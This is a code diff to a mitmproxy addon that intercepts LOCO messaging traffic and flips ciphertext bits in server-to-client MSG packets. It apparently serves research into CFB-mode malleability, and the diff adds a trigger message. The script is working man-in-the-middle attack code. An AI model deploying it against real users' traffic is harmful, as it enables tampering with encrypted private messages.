@@ -26,11 +26,13 @@ class LocoMitmBase:
 
 
 class FlipCiphertextBits(LocoMitmBase):
-    def __init__(self) -> None:
+    def __init__(self, trigger_msg) -> None:
         self.parser = LocoParser()
+        self.trigger_msg = trigger_msg
 
     def tcp_message(self, flow: tcp.TCPFlow):
         message = flow.messages[-1]
+        flipped_packet = b""
         self.parser.parse(message.content)
 
         if self.parser.loco_packet:
@@ -48,11 +50,12 @@ class FlipCiphertextBits(LocoMitmBase):
 
             return
 
-        # Flip bits of the ciphertext to show CFB malleability
-        flipped_packet = self.parser.flip_bits()
+        # Flip ciphertext bits to show CFB malleability
+        if not message.from_client and self.parser.loco_packet.loco_command == "MSG":
+            flipped_packet = self.parser.flip_bits(self.trigger_msg)
 
         if flipped_packet:
             message.content = flipped_packet
 
 
-addons = [FlipCiphertextBits()]
+addons = [FlipCiphertextBits(trigger_msg="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")]
